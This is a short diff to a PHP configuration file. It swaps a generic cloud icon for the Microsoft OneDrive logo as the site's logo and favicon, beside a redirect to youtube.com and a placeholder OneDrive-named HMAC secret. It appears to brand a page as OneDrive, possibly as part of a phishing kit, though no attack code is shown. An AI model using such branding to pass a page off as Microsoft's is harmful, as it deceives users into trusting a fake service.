@@ -1,7 +1,7 @@
 <?php
 
-define('LOGO_URL', 'https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/icons/cloud-fill.svg');
-define('FAVICON_URL', 'https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/icons/cloud-fill.svg');
+define('LOGO_URL', 'https://upload.wikimedia.org/wikipedia/commons/5/59/Microsoft_Office_OneDrive_%282019%E2%80%932025%29.svg');
+define('FAVICON_URL', 'https://upload.wikimedia.org/wikipedia/commons/5/59/Microsoft_Office_OneDrive_%282019%E2%80%932025%29.svg');
 
 define('REDIRECT_URL', 'https://youtube.com');
 
@@ -24,3 +24,4 @@ define('TILE_LABELS', [
 ]);
 
 define('HMAC_SECRET', 'change-this-to-a-random-onedrive-secret-xyz987');
+
